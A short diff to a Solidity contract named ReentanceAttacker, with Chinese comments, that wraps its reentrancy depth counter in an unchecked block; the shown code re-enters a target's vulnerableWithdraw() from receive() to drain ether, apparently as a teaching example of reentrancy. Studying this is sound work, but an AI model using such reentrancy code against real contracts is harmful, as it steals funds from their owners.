@@ -54,7 +54,11 @@ contract ReentanceAttacker {
     // 这里是关键 触发回调
     receive() external payable {
         // 控制重入的深度=相当于控制递归的深度,不然就是无限递归了
-        cycle++;
+        unchecked {
+            //这里肯定不会溢出,也就是循环两次
+            cycle++;
+        }
+
         if (baseContract.getBalace() >= 1 ether && cycle < 3) {
             baseContract.vulnerableWithdraw();
             emit TriggerReceive(msg.sender, msg.value);
